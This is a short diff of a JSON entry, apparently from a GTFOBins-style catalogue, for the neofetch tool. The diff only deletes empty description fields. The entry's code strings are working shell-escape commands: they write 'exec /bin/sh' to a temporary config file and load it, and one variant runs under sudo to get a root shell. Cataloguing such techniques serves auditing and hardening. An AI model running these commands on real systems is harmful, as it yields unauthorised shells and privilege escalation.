@@ -2,7 +2,7 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nneofetch --config $TF\n"
       }
     ],
@@ -14,7 +14,7 @@
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nsudo neofetch --config $TF\n"
       }
     ]
